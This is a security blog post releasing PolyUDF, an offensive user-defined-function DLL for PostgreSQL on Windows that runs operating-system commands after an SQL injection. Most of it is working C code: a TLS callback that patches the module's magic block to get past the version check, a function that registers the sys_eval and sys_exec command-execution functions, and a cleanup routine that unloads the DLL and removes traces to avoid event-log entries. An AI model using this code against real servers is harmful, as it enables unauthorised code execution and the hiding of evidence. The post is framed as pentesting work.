---
layout: post
title:  "PostgreSQL universal UDF module for Windows"
date:   2020-02-05 00:00:00 -0500
categories: tools
author: RoP Team
lang: en
lang-ref: polyudf-one-dll-to-rule-them-all
---

The tool we are releasing today implements some not so novel techniques but very cleaver for the purpose and not seen before in this specific use-case.

The use of *User Defined Functions (UDF)* to achieve Code Execution in different DBMS is not new, but implementing it in a clean and efficient way for PostgreSQL, and particulary running under Windows OS, always required multiple steps: detecting the exact version of the DBMS (9.x, 10.x, etc.), after that modify the UDF dll source code or compile with the exact PostgreSQL version libs and headers. This process have been demostrated to be less than user friendly and prone to errors, and even considered too complex to worth the efforts (yes we are lazy for the simple tasks).

<!--more-->

**Note:** Uploading the DLL to the server is out of scope of this post as there are plenty of information about how doing it on the internet (Ex. using *pg_largeobject* [[1](https://www.postgresql.org/docs/9.1/catalog-pg-largeobject.html)][[2](https://github.com/nixawk/pentest-wiki/blob/master/2.Vulnerability-Assessment/Database-Assessment/postgresql/postgresql_hacking.md)]).

## Short Long Story: Productive Laziness
During one of our pentestings a few years ago we found an SQL injection vulnerability on an aplication that used PostgreSQL as DBMS. The first thing to check was if we had dba (postgres user) priviledges ... and *voilà*! we were running under ***postgres*** user! Now it was time to get Remote Code Execution (RCE), the obvious method was abusing the feature of User Defined Functions by uploading the evil module by any mean. For achieving RCE we need to know the Operating System version that the DBMS is running on so we can upload the correct module (.dll or .so file). In this case we were in front of a PostgreSQL running on a Windows Server OS - I don't remember the exact versions now but they are no relevant for the purpouse of the post.
At this point we found that the module that we had compiled for another pentesting was rejected! It was compiled for a different PostgreSQL version so we had to re-compile it for the target PostgreSQL version. In this case there was no need to change the source code, only the library and headers of PostgreSQL. This kind of extra issues made no sense and we needed to understand it! and may be we could improve it. We were tired of recompiling that UDF module and installing the especific PostgreSQL version just for the libs and headers.

## The Version Problem
After this pentesting we had some spare time to discuss and get creative about this last experience with PostgreSQL. Digging in the source code and structures used in the UDF module, the macro that caught our attention was *PG_MODULE_MAGIC_DATA* and with it the structure *Pg_magic_struct* both defined in [fmgr.h][1]:

```c
//...
/* Definition of the magic block structure */
typedef struct    
{
    int len; /* sizeof(this struct) */
    int version; /* PostgreSQL major version */    
    int funcmaxargs; /* FUNC_MAX_ARGS */
    int indexmaxkeys; /* INDEX_MAX_KEYS */
    int namedatalen; /* NAMEDATALEN */
    int float8byval; /* FLOAT8PASSBYVAL */    
} Pg_magic_struct;

/* The actual data block contents */    
#define PG_MODULE_MAGIC_DATA \
{ \    
    sizeof(Pg_magic_struct), \    
    PG_VERSION_NUM / 100, \
    FUNC_MAX_ARGS, \    
    INDEX_MAX_KEYS, \    
    NAMEDATALEN, \
    FLOAT8PASSBYVAL \    
}    PG_MODULE_MAGIC
//...
```
*Source: [fmgr.h][1]*

Checking the macro we found a reference to the version value in the constant *PG_VERSION_NUM*, searching for the definition of this constant we found it in [pg_config.h.win32][2].
```c
//...
/* PostgreSQL version as a number */
#define PG_VERSION_NUM 130000
//...
```
*Source: [pg_config.h.win32][2]*

With this information we guess that the *postgres.exe* process checks the value of this field to validate if the module have been compiled using the headers for its specific version. As this value is divided by 100 only major and minor version are validated and the revision number is discarded. The *postgres.exe* process gets the module *PG_MODULE_MAGIC_DATA* address throught the ***Pg_magic_func*** export symbol and validates the structure's fields. This validation is made when the module is loaded by *postgres.exe*, before any User Defined Function can be loaded. This hyphotesis was confirmed while checking the PostgreSQL source code of the function *internal_load_library* defined in [dfmgr.c][3] and in the function *incompatible_module_error*, also defined in that file, where those validations are performed.

```c
//...

static void
incompatible_module_error(const char *libname,
						  const Pg_magic_struct *module_magic_data)
{
	StringInfoData details;

	/*
	 * If the version doesn't match, just report that, because the rest of the
	 * block might not even have the fields we expect.
	 */
	if (magic_data.version != module_magic_data->version)
	{
		char		library_version[32];

		if (module_magic_data->version >= 1000)
			snprintf(library_version, sizeof(library_version), "%d",
					 module_magic_data->version / 100);
		else
			snprintf(library_version, sizeof(library_version), "%d.%d",
					 module_magic_data->version / 100,
					 module_magic_data->version % 100);
		ereport(ERROR,
				(errmsg("incompatible library \"%s\": version mismatch",
						libname),
				 errdetail("Server is version %d, library is version %s.",
						   magic_data.version / 100, library_version)));
	}

//...
```
*Source: [dfmgr.c][3]*

## Fooling the boss: Changing on the Fly
With all the information collected we started discussing about different ways to bypass that checks, the more obvious was changing on the fly the *Pg_magic_struct* and set to the expected values  by the *internal_load_library* and *incompatible_module_error* functions, these values depend on the version of the DBMS so the question that we needed to answer before anything was "*How can i get the DBMS version?*" .
We could use the built-in functions of PostgreSQL *pg_version()* but it returns a string that will vary in formats and will need more work to get the correct values.  Finally we decided to use a characteristic that windows has for saving file version information in the .rsrc section of PE Executables, using this we could get the required information without much effort, and in numeric format! (Lazinezz again!). For this purpouse we use the [GetFileVersionInfo][4] and family.
Wrth the strategy defined and the required information accessible we needed to find the best suitable way to implement it, and with suitable we meant the easiest and fastest way!

### TLS and TLS Callbacks
#### Thread Local Storage (TLS)
A  key concept we need to understand is *Thread Local Storage (TLS)*:  *`"Thread-local storage (TLS) is a computer programming method that uses static or global memory local to a thread."`* - *[Wikipedia][5]*, this method is implemented in different ways by each compiler and/or Operating System. In the case of windows it is defined as:  
*`"Thread Local Storage (TLS) is the method by which each thread in a given multithreaded process can allocate locations in which to store thread-specific data. Dynamically bound (run-time) thread-specific data is supported by way of the TLS API (TlsAlloc). Win32 and the Microsoft C++ compiler now support statically bound (load-time) per-thread data in addition to the existing API implementation."`*-*[Microsoft][6]*. In the TLS Windows defines and stores data objects that are not automatic variables (defined in the limited thread stack), as these objects and data are stored unintialized there must be a mechanism to initialize the whenever a thread is created, this mechanism are the ***TLS Callbacks***.
#### TLS Callbacks
TLS Callbacks are the way that windows allows the initialization of all the data and objects defined as thread-specific. To comply with the desired function of TLS Callbacks, these must be called before the main program's entrypoint. Abusing this requirement we can execute any code that we want before the main programs code, **even before the PostgreSQL validations!**
### Putting the pieces together
With all the previous elements we are able to guess where we are going to: Using TLS Callbacks detect PostgreSQL version using the GetFileVersionInfo function and with that information fill the *Pg_magic_struct* structure with the correct values. It worked flawless for versions 9.5+ for x86 and x64 but on version 9.4 the tested builds FLOAT8PASSBYVAL field were always **false**, and as we are compiling with the headers for PostgreSQL version 9.5+ we need to patch it programatically. After several tests we were more than happy with the results, but we wanted to go beyond, going further in this road, put some cherries on the Ice Cream!
```c
...
void NTAPI TlsCallBack(PVOID hModule, DWORD dwReason, PVOID pv)
{
	elog(NOTICE, "TlsCallBack: dwReason: %d", dwReason);

	if (dwReason != DLL_PROCESS_ATTACH) {
		elog(NOTICE, "TlsCallBack: dwReason != DLL_PROCESS_ATTACH. Leaving.");
		return;
	}

	char ModulePath[MAX_PATH] = { 0 };
	WORD* data = NULL;
	char* version = NULL;
	int major = 0, minor = 0;

	// Save Module Handler for sys_cleanup usage
	hLibModule = hModule;

	// Find postgres.exe process on memory and get file path
	HANDLE hPostgres = GetModuleHandleA((LPCSTR)"postgres.exe");
	if (hPostgres == NULL) {
		elog(NOTICE, "[!] Cannot find postgres process on memory!\n");
		return;
	}
	GetModuleFileNameA(hPostgres, ModulePath, MAX_PATH);

	// Get File Version Information for Patching PG_MODULE_MAGIC_DATA
	DWORD  verHandle = 0;
	UINT   size = 0;
	LPBYTE lpBuffer = NULL;
	DWORD  verSize = GetFileVersionInfoSize(ModulePath, &verHandle);

	if (verSize == NULL) {
		elog(NOTICE, "[!] GetFileVersionInfoSize failed!\n");
		return;
	}

	LPSTR verData = malloc(verSize);
	if (!GetFileVersionInfo(ModulePath, verHandle, verSize, verData))
	{
		elog(NOTICE, "[!] GetFileVersionInfo failed!\n");
		return;
	}

	if (VerQueryValue(verData, "\\", (VOID FAR* FAR*)&lpBuffer, &size))
	{
		if (size)
		{
			VS_FIXEDFILEINFO *verInfo = (VS_FIXEDFILEINFO *)lpBuffer;
			if (verInfo->dwSignature == 0xfeef04bd)
			{
				// Doesn't matter if you are on 32 bit or 64 bit,
				// DWORD is always 32 bits, so first two revision numbers
				// come from dwFileVersionMS, last two come from dwFileVersionLS
				elog(NOTICE, "File Version: %d.%d.%d.%d\n",
					(verInfo->dwFileVersionMS >> 16) & 0xffff,
					(verInfo->dwFileVersionMS >> 0) & 0xffff,
					(verInfo->dwFileVersionLS >> 16) & 0xffff,
					(verInfo->dwFileVersionLS >> 0) & 0xffff
				);

				// PG_MODULE_MAGIC_DATA Patching. Here the magic happens ;-)
				int* dMagic = (int *)&Pg_magic_data;
				elog(NOTICE, "[Entry] PG_MAGIC_FUNCTION_NAME: %d\n", dMagic[1]);
				unsigned int pgMajor = (verInfo->dwFileVersionMS >> 16) & 0xffff;
				unsigned int pgMinor = (verInfo->dwFileVersionMS >> 0) & 0xffff;

				// EnterpriseDB builds for Windows set FLOAT8PASSBYVAL to false even on 64 bit architectures.
				// It changed on 9.5+ builds. This small hack is required to keep wide range compatibility on 9.x family
				// Reference: https://lists.osgeo.org/pipermail/postgis-users/2018-May/042757.html
				if ((pgMajor == 9 && pgMinor <= 4) || (pgMajor < 9)) {
					elog(NOTICE, "Version <9.5 detected. Patching FLOAT8PASSBYVAL to false");
					Pg_magic_data.float8byval = false;
				}
				dMagic[1] = (pgMajor * 100 + pgMinor);
				elog(NOTICE, "[Fixed] PG_MAGIC_FUNCTION_NAME: %d\n", dMagic[1]);
			}
		}
	}
	free(verData);
	return;
}
...
```
*Source: [main.c][7]*
### Final cherries
On every pentesting or red teaming engagement we always try to be as stealty as possible, and there was something that was blocking us from achieving this goal. Whenever we loaded the UDF module we needed to restart the PostreSQL service to unload the module from memory and be able to delete the file from disk. Another thing that we where doing a lot and we were tired of doing was registering and unregistering the functions on the PostgreSQL, why don't write a function that register them all? And, as we are lazy, also another function that unregister them all. So we were just two functions away from our desired state of fullfiness.
#### Wake up Poly: sys_register()
Our desire was to execute the minimal amount of lines to get all ready for explotation, we now have two functions, but we could implement a lot more, and it will require us to write new SQL queries to register those functions, so the question that arise was: *"why don't do it programatically?"*, and the quest began. After several google searchs and being about to throw the towel we found the desired feature and correct terms: **SPI** (Server Programming Interface), with it the function [*SPI_connect*][8] and [*SPI_exec*][9], with the help of those functions it was just a matter of getting dynamically the DLL path and formating the correct SQL queries to get everything register with just one powerfull function. ***First cherry on top of our Ice Cream!***
```c
...
/*
UDF that use SPI to register all the UDFs in this DLL. This simplify explotation and post explotation cleanup.
Note: In case one or all functions are already registered it will replace them without throwing an error.
See: sys_cleanup(bool)
*/
PGDLLEXPORT Datum sys_register(PG_FUNCTION_ARGS);
PG_FUNCTION_INFO_V1(sys_register);
Datum sys_register(PG_FUNCTION_ARGS) {
	char ModulePath[MAX_PATH] = { 0 };
	int result;
	result = 0;
	char *regcmd = NULL;
	int msize = GetModuleFileNameA(hLibModule, ModulePath, MAX_PATH);

	if (msize == 0) {
		PG_RETURN_INT32(result);
	}

	if (SPI_connect() == SPI_OK_CONNECT) {
		int ret;
		elog(NOTICE, "[sys_register] DLL Path '%s'", ModulePath);
		regcmd = (char *)malloc(1024);

		sprintf(regcmd, "CREATE OR REPLACE FUNCTION sys_cleanup(bool) RETURNS int4 AS '%s','sys_cleanup' LANGUAGE c VOLATILE STRICT COST 1", ModulePath);
		elog(NOTICE, "[sys_register] Command:\n%s", regcmd);
		ret = SPI_exec(regcmd, 0);

		sprintf(regcmd, "CREATE OR REPLACE FUNCTION sys_eval(text) RETURNS text AS '%s', 'sys_eval' LANGUAGE c VOLATILE STRICT COST 1", ModulePath);
		elog(NOTICE, "[sys_register] Command:\n%s", regcmd);
		ret = SPI_exec(regcmd, 0);

		sprintf(regcmd, "CREATE OR REPLACE FUNCTION sys_exec(text) RETURNS int4 AS '%s', 'sys_exec' LANGUAGE c VOLATILE STRICT COST 1", ModulePath);
		elog(NOTICE, "[sys_register] Command:\n%s", regcmd);
		ret = SPI_exec(regcmd, 0);

		free(regcmd);

		SPI_finish();
		result = 1;
	}
	PG_RETURN_INT32(result);
}
...
```
*Source: [main.c][7]*

#### Poly is leaving: sys_cleanup()
Every story has to end, even for Poly. When we have done all the required tasks as information gathering and lateral movement, remember UDF is a mechanism to achieve the first RCE, we will use it to move to another more flexible and persistent mechanism as a backdoor or implant. To leave no trace nor clue about our abuse of the PostgreSQL we need to delete the functions and the DLL file. PostgreSQL keeps the module loaded on memory even when no function is registered, normaly we will need to restart the service to be able to delete the files, but we don't want to leave that event in the event log. We need to unload the module from memory and end execution, this will be almos imposible as the DLL unloading requires unmap the memory where is our code. We are not the only ones that requires this kind of functionality and Windows API have the answer! [*FreeLibraryAndExitThread*][10], we will use it to decrement de module count so the Windows will unmap the DLL from memory and release the lock of the file. We cannot do it from inside the called function because it will generate a crash, the *FreeLibraryAndExitThread* does not returns and the PostgreSQL expects every function it calls to return safely. To avoid this restriction we will use a Thread that will sleep for a second and then call [*FreeLibraryAndExitThread*] to unload and unmap the DLL and allow us to delete the DLL file!
```c
/*
UDF that use SPI to unload DLL module for allowing deleting it from disk. It will also drop all the UDFs in the DLL if @dropFn is true.
@dropFn flag to enable UDFs unregistering.
*/
PGDLLEXPORT Datum sys_cleanup(PG_FUNCTION_ARGS);
PG_FUNCTION_INFO_V1(sys_cleanup);
Datum sys_cleanup(PG_FUNCTION_ARGS) {
	int result;
	result = 0;
	bool dropFn = PG_GETARG_BOOL(0);

	// Reference: https://www.postgresql.org/docs/9.0/spi-examples.html
	if (dropFn && SPI_connect() == SPI_OK_CONNECT) {
		int ret;

		elog(NOTICE, "[sys_cleanup] Going to DROP sys_register");
		ret = SPI_exec((LPCSTR)"drop function sys_register()", 0);
		elog(NOTICE, "[sys_cleanup] SPI_exec returnet %d", ret);

		elog(NOTICE, "[sys_cleanup] Going to DROP sys_eval");
		ret = SPI_exec((LPCSTR)"drop function sys_eval(text)", 0);
		elog(NOTICE, "[sys_cleanup] SPI_exec returnet %d", ret);

		elog(NOTICE, "[sys_cleanup] Going to DROP sys_exec");
		ret = SPI_exec((LPCSTR)"drop function sys_exec(text)", 0);
		elog(NOTICE, "[sys_cleanup] SPI_exec returnet %d", ret);

		elog(NOTICE, "[sys_cleanup] Going to DROP sys_cleanup");
		ret = SPI_exec((LPCSTR)"drop function sys_cleanup(bool)", 0);
		elog(NOTICE, "[sys_cleanup] SPI_exec returnet %d", ret);
		SPI_finish();
		result = 1;
	}

	elog(NOTICE, "Create Clenup Thread");
	CreateThread(
		NULL,			// default security attributes
		0,				// use default stack size  
		CleanUp,		// thread function name
		NULL,			// argument to thread function
		0,				// use default creation flags
		NULL);			// returns the thread identifier

	PG_RETURN_INT32(result);
}

/*
Thread used to execute Module Unloading. It uses FreeLibraryAndExitThread to safely execute code from the DLL to be unloaded
*/
DWORD WINAPI CleanUp(LPVOID lpParam)
{
	elog(NOTICE, "[CleanUp] Thread Start and sleep");
	Sleep(1000);
	elog(NOTICE, "[CleanUp] About to call FreeLibraryAndExitThread");
	FreeLibraryAndExitThread(hLibModule, 0x0);
	return 0;
}
```
*Source: [main.c][7]*
## We want it!
Well after this brief explanation the our has come: Release time! And video Time! The complete implementation is available on our GitHub repository: [PolyUDF][11]
{:refdef: style="text-align: center;"}
[![PolyUDF on action!](http://img.youtube.com/vi/-89qvnDvFek/0.jpg)](http://www.youtube.com/watch?v=-89qvnDvFek "PolyUDF - PostgreSQL universal UDF module for Windows"){:target="_blank"}
{: refdef}

[1]:https://github.com/postgres/postgres/blob/master/src/include/fmgr.h
[2]:https://github.com/postgres/postgres/blob/master/src/include/pg_config.h.win32
[3]:https://github.com/postgres/postgres/blob/master/src/backend/utils/fmgr/dfmgr.c
[4]:https://docs.microsoft.com/en-us/windows/win32/api/winver/nf-winver-getfileversioninfoa
[5]:https://en.wikipedia.org/wiki/Thread-local_storage
[6]:https://docs.microsoft.com/en-us/cpp/parallel/thread-local-storage-tls?view=vs-2019
[7]:https://github.com/rop-la/PolyUDF/blob/master/PolyUDF/main.c
[8]:https://www.postgresql.org/docs/8.2/spi-spi-connect.html
[9]:https://www.postgresql.org/docs/8.2/spi-spi-exec.html
[10]:https://docs.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-freelibraryandexitthread
[11]:https://github.com/rop-la/PolyUDF

> Written by **RoP Team**
